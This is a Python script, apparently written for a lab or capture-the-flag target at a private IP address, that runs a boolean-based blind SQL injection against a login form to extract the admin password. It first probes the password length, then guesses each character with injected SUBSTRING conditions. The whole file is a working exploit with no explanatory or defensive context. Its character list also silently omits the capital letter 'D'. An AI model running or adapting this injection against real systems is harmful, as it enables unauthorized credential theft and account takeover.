import requests
from bs4 import BeautifulSoup


def bruteforce():
    url = "http://192.168.51.10:8080"
    password = ""
    password_length = 0

    while True:
        payload = {"username": f"admin' AND LENGTH(password)={password_length};--"}
        r = requests.post(url, data=payload)
        html_text = BeautifulSoup(r.text, "html.parser")
        if html_text.p is not None:
            break
        password_length += 1

    characters = """abcdefghijklmnopqrstuvwxyzABCERFGHIJKLMNOPQRSTUVWXYZ1234567890!"#$%&'(),./\\;:[]@-^<>?_+*{}`=~|"""
    for idx in range(1, password_length + 1):
        for c in characters:
            payload = {
                "username": f"admin' AND BINARY SUBSTRING(password, {idx}, 1)='{c}';--"
            }
            r = requests.post(url, data=payload)
            html_text = BeautifulSoup(r.text, "html.parser")
            if html_text.p is not None:
                password += c
                break
    print(f"password: {password}")


if __name__ == "__main__":
    bruteforce()
